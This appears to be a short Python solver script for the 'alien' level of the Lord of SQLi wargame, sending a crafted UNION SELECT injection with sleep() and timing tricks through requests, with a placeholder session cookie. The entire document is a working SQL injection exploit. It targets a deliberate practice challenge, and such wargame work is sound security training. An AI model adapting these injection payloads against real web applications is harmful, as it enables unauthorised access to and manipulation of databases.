import requests
import time

cookie = {'PHPSESSID' : '~~~~'}

url = "https://los.rubiya.kr/chall/alien_91104597bf79b4d893425b65c166d484.php?no=1 union select concat(char(((%d-second(now())) div 3) %%2b 65 - sleep(3)),\"dmin\")%%23' union select concat(char(((%d-second(now())) div 3) %%2b 65 - sleep(3)),\"dmin\")%%23" % (97+(time.localtime(time.time()).tm_sec), 97+9+(time.localtime(time.time()).tm_sec))
res = requests.get(url, cookies=cookie)
print(res.text.split('<span style="color: #0000BB">&lt;?php')[0])